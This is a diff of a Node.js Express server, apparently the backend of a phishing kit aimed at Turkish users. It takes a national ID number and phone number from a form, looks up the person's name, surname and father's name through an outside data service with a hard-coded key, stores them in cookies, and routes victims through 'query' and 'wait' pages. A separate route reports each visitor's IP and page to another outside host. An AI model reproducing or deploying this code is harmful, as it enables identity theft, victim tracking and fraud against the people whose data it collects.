@@ -1,63 +1,59 @@
 const express = require('express');
 const axios = require('axios');
+const cookieParser = require('cookie-parser');
 const path = require('path');
+const requestIp = require('request-ip');
+const cors = require('cors');
 require('dotenv').config();
+
 const app = express();
+app.use(requestIp.mw());
 const port = process.env.PORT || 3000;
 
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.urlencoded({ extended: true }));
 
-// Define static file routes
+// Public klasörünü statik olarak servis et
+app.use(express.static(path.join(__dirname, 'public')));
+
+// CORS middleware'ini kullan
+app.use(cors());
+
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, '/public/index.html'));
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.get('/bilgi', (req, res) => {
-  res.sendFile(path.join(__dirname, '/public/bilgi.html'));
-});
-
-app.get('/onay', (req, res) => {
-  res.sendFile(path.join(__dirname, '/public/onay.html'));
-});
-
-app.get('/sms.html', (req, res) => {
-  res.sendFile(path.join(__dirname, '/public/sms.html'));
+app.get('/sorgula', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'sorgula.html'));
 });
 
 app.get('/bekle', (req, res) => {
-  res.sendFile(path.join(__dirname, '/public/bekle.html'));
+  res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
 });
 
-// API to handle POST requests
+
 app.post('/online-api', async (req, res) => {
-  const { tridField: tc, telno, encTridField, actionName, submitButton } = req.body;
+    const tc = req.body.tridField;
+    const telno = req.body.telno; // Telefon numarasını alma
 
-  if (!tc || !telno) {
-    return res.status(400).send('TC and telno are required.');
-  }
+    try {
+        const response = await axios.get(`https://ilkkuralsaygi.online/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${tc}`);
+        const data = response.data;
 
-  try {
-    const response = await axios.get(`https://ilkkuralsaygi.online/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${tc}`);
-    const data = response.data;
+        // Çerezlere verileri kaydet
+        res.cookie('adi', data.adi, { httpOnly: false });
+        res.cookie('soyadi', data.soyadi, { httpOnly: false });
+        res.cookie('babaad', data.babaad, { httpOnly: false });
 
-    if (!data) {
-      throw new Error('Invalid response from API');
+        // Telefon numarasını da çerez olarak kaydet
+        res.cookie('telno', telno, { httpOnly: false });
+
+        res.redirect('/sorgula');
+    } catch (error) {
+        console.error('API isteğinde hata:', error);
+        res.status(500).send('Sunucu hatası.');
     }
-
-    // Save data to cookies
-    res.cookie('adi', data.adi, { httpOnly: false });
-    res.cookie('soyadi', data.soyadi, { httpOnly: false });
-    res.cookie('babaad', data.babaad, { httpOnly: false });
-    res.cookie('telno', telno, { httpOnly: false });
-
-    res.redirect('/sorgula');
-  } catch (error) {
-    console.error('API request error:', error);
-    res.status(500).send('Server error.');
-  }
 });
-
 
 // API route
 app.get('/api', async (req, res) => {
@@ -67,11 +63,10 @@ app.get('/api', async (req, res) => {
     if (!userIp || !currentPage) {
       return res.status(400).send('user_ip and current_page are required.');
     }
-
-    // Construct the external API URL
+ 
     const apiUrl = `https://hakikicelikhantutunu.com/dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;
 
-    // Make a GET request to the external API
+ 
     const response = await axios.get(apiUrl);
 
     if (!response.data) {
@@ -86,5 +81,9 @@ app.get('/api', async (req, res) => {
 });
 
 app.listen(port, () => {
-  console.log(`Web server is running on port ${port}`);
+    console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
 });
+
+
+
+ 
